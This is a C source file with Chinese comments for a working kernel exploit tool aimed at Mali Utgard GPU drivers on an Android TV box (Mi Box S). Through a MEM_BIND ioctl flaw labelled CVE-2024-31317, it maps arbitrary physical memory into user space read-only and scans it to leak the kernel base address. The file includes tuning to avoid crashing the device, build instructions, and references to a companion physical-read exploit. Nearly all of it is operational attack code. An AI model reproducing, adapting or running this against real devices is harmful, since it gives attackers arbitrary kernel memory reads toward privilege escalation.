/*
 * kort_leak_scan.c - 用推荐的物理映射原语「自泄露」内核地址 (防重启版)
 *
 * 方法 (use.md §6 / uses.md / kort_phys_read2.c):
 *   MEM_BIND (CVE-2024-31317, nr=2, 0xC0288302) 把内核物理页绑到 GPU VA
 *   -> 对 /dev/mali mmap(PROT_READ) -> 直接从 CPU 读该物理页
 *   -> 扫 "Linux version" banner + ARM64 Image 头 magic 0x644d5241(@+0x38) 定位基址
 *
 * 为什么之前一扫就重启 (本版已修):
 *   1) 默认扫描窗口从 0x01000000 起, 该地址在 Mi Box S 上位于内核 Image
 *      (基址 0x01080000) 之下, 属 ATF/BL2/保留设备内存; 把它 BIND 后 CPU 一读
 *      触发总线异常(SError) -> 内核 panic -> 重启.  -> 窗口改为从 0x01080000 向上.
 *   2) MEM_UNBIND(0xC0108303) 是未验证 ioctl, 可能本身是崩溃源.
 *      -> 本版彻底不用 unbind, 改用「轮换 GPU VA 池」避免同一 VA 重复绑定冲突.
 *
 * 安全: 纯只读, 零写入. 每步 alarm() 超时保护.
 *
 * 编译 (NDK 21.4, 32 位 armeabi-v7a, 静态):
 *   set NDK=C:\Users\Administrator\AppData\Local\Android\Sdk\ndk\21.4.7075529
 *   set CLANG=%NDK%\toolchains\llvm\prebuilt\windows-x86_64\bin\armv7a-linux-androideabi24-clang
 *   %CLANG% kort_leak_scan.c -o kort_leak_scan -static
 *
 * 用法:
 *   kort_leak_scan                 扫描默认窗口 0x01080000..0x01480000 (已知 RAM)
 *   kort_leak_scan -s 0x01080000 0x01600000   自定义窗口(务必在 System RAM 内!)
 *   kort_leak_scan -p 0x01080000              单页 dump(Image 头 + banner 校验)
 *   kort_leak_scan -p 0x01080000 -d           额外 hexdump 0x200 字节
 *
 * 找准确 RAM 边界(避免重启的关键):
 *   adb shell "cat /proc/iomem"   看 "Kernel" / "System RAM" 起止, 只扫那段
 */

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <stdint.h>
#include <fcntl.h>
#include <unistd.h>
#include <errno.h>
#include <signal.h>
#include <getopt.h>
#include <sys/ioctl.h>
#include <sys/mman.h>

/* ---- Mali Utgard ioctl (r10p1, 已验证) ---- */
#define MALI_IOC_MEM_BIND   0xC0288302   /* _IOWR(0x83, 2, 40)  */

#define GPU_VA_BASE  0x41000000u        /* 绑定 VA 池基址 */
#define VA_POOL      512                /* 轮换 VA 数量(避免重复绑定冲突, 不调用 unbind) */
#ifndef PAGE_SIZE
#define PAGE_SIZE    0x1000
#endif
#define BIND_FLAGS   0x800              /* _MALI_MEMORY_BIND_BACKEND_EXTERNAL_MEMORY */
#define BIND_RIGHTS  0x37

static volatile int g_to = 0;
static void alh(int s) { (void)s; g_to = 1; }

static int tio(int fd, unsigned int cmd, void *buf, int t) {
    alarm(t); g_to = 0;
    int r = ioctl(fd, cmd, buf);
    int e = errno;
    alarm(0);
    if (g_to) return -999;
    return r == 0 ? 0 : -e;
}

/* BIND 一页物理内存到指定 GPU_VA (修正布局: phys@24, rights@28) */
static int bind_phys(int fd, uint32_t phys, uint32_t gpu_va, uint32_t size) {
    uint8_t raw[40];
    memset(raw, 0, sizeof(raw));
    uint64_t ctx = 0;
    uint32_t vaddr = gpu_va, sz = size, fl = BIND_FLAGS, pa = phys, rights = BIND_RIGHTS;
    memcpy(raw + 0,  &ctx,    8);
    memcpy(raw + 8,  &vaddr,  4);
    memcpy(raw + 12, &sz,     4);
    memcpy(raw + 16, &fl,     4);
    memcpy(raw + 24, &pa,     4);
    memcpy(raw + 28, &rights, 4);
    return tio(fd, MALI_IOC_MEM_BIND, raw, 3);
}

/* 读一页: bind(va) -> mmap(PROT_READ) -> copy -> munmap (不调用 unbind) */
static int read_page_va(int fd, uint32_t phys, uint32_t gpu_va, uint8_t *out) {
    if (bind_phys(fd, phys, gpu_va, PAGE_SIZE) != 0) return -1;
    void *m = mmap(NULL, PAGE_SIZE, PROT_READ, MAP_SHARED, fd, gpu_va);
    if (m == MAP_FAILED) return -2;
    memcpy(out, m, PAGE_SIZE);
    munmap(m, PAGE_SIZE);
    return 0;
}

static int find_str(const uint8_t *p, int n, const char *s) {
    int ls = (int)strlen(s);
    if (ls <= 0 || ls > n) return -1;
    for (int i = 0; i + ls <= n; i++)
        if (memcmp(p + i, s, ls) == 0) return i;
    return -1;
}

static void hexdump(const uint8_t *b, int n) {
    for (int i = 0; i < n; i += 16) {
        printf("  %04x:", i);
        for (int j = 0; j < 16; j++) printf(" %02x", b[i + j]);
        printf("  ");
        for (int j = 0; j < 16; j++)
            printf("%c", (b[i+j] >= 0x20 && b[i+j] < 0x7f) ? b[i+j] : '.');
        printf("\n");
    }
}

/* 扫描: 在 [start,end) 逐页找 banner 与 ARM64 头 magic (只用 RAM 窗口!) */
static void scan_range(int fd, uint32_t start, uint32_t end) {
    printf("[*] scan phys 0x%08x .. 0x%08x (step 0x%x, VA pool=%d)\n",
           start, end, PAGE_SIZE, VA_POOL);
    printf("[*] 注意: 只扫 System RAM! 扫到设备/保留内存会重启设备\n");
    uint8_t page[PAGE_SIZE];
    int found = 0, idx = 0;
    for (uint32_t pa = start; pa < end; pa += PAGE_SIZE) {
        uint32_t va = GPU_VA_BASE + (uint32_t)(idx % VA_POOL) * PAGE_SIZE;
        int r = read_page_va(fd, pa, va, page);
        idx++;
        if (r == -2) continue;                       /* mmap EFAULT: 跳过该页 */
        if (r != 0)  continue;                       /* bind 失败(含 VA 复用冲突): 跳过 */

        int off_banner = find_str(page, PAGE_SIZE, "Linux version");
        uint32_t magic = 0;
        if (PAGE_SIZE >= 0x3C) memcpy(&magic, page + 0x38, 4);
        int is_stext = (magic == 0x644d5241u);
        uint32_t code0 = 0; memcpy(&code0, page, 4);

        if (off_banner >= 0 || is_stext) {
            printf("\n[+] HIT phys=0x%08x", pa);
            if (is_stext)      printf("  ARM64_MAGIC(_stext)");
            if (off_banner>=0) printf("  \"Linux version\"@+0x%x", off_banner);
            printf("\n");
            if (is_stext)
                printf("    code0=0x%08x (expect 0x14498000 for 4KB-page 4.9)\n", code0);
            if (off_banner >= 0) {
                int e = off_banner;
                while (e < PAGE_SIZE && page[e] != '\n') e++;
                printf("    banner: ");
                for (int i = off_banner; i < e && i < PAGE_SIZE; i++) putchar(page[i]);
                printf("\n");
            }
            found++;
            if (found >= 4) { printf("\n[*] 已找到 %d 处, 停止扫描\n", found); break; }
        }
    }
    if (!found) printf("[-] 窗口内未找到内核 Image; 用 -s 缩小到 System RAM, 或 -p 直接读已知基址\n");
}

int main(int argc, char **argv) {
    struct sigaction sa; memset(&sa, 0, sizeof(sa)); sa.sa_handler = alh;
    sigaction(SIGALRM, &sa, NULL);
    setvbuf(stdout, NULL, _IONBF, 0);

    uint32_t start = 0x01080000u, end = 0x01480000u;
    uint32_t pa = 0; int have_pa = 0, dump = 0;

    int c;
    while ((c = getopt(argc, argv, "s:p:d")) != -1) {
        switch (c) {
        case 's': start = strtoul(optarg, 0, 0);
                  end   = strtoul(argv[optind], 0, 0); optind++; break;
        case 'p': pa = strtoul(optarg, 0, 0); have_pa = 1; break;
        case 'd': dump = 1; break;
        default: break;
        }
    }

    int fd = open("/dev/mali", O_RDWR);
    if (fd < 0) { perror("[-] open /dev/mali"); return 1; }
    printf("[+] opened /dev/mali fd=%d\n", fd);

    if (have_pa) {
        uint8_t page[PAGE_SIZE];
        printf("[*] read single page phys=0x%08x\n", pa);
        int r = read_page_va(fd, pa, GPU_VA_BASE, page);
        if (r == -2)      printf("[-] mmap failed (EFAULT? 检查 phys@24/rights@28 布局)\n");
        else if (r != 0)  printf("[-] bind failed\n");
        else {
            uint32_t code0 = 0; memcpy(&code0, page, 4);
            uint32_t magic = 0; memcpy(&magic, page + 0x38, 4);
            printf("[+] read OK\n");
            printf("    code0=0x%08x  arm64_magic@+0x38=0x%08x (%s)\n",
                   code0, magic, magic == 0x644d5241u ? "HIT _stext" : "no");
            int ob = find_str(page, PAGE_SIZE, "Linux version");
            if (ob >= 0) printf("    \"Linux version\"@+0x%x\n", ob);
            if (dump) { printf("[*] dump 0x200:\n"); hexdump(page, 0x200); }
        }
    } else {
        scan_range(fd, start, end);
    }

    close(fd);
    printf("[*] done\n");
    return 0;
}
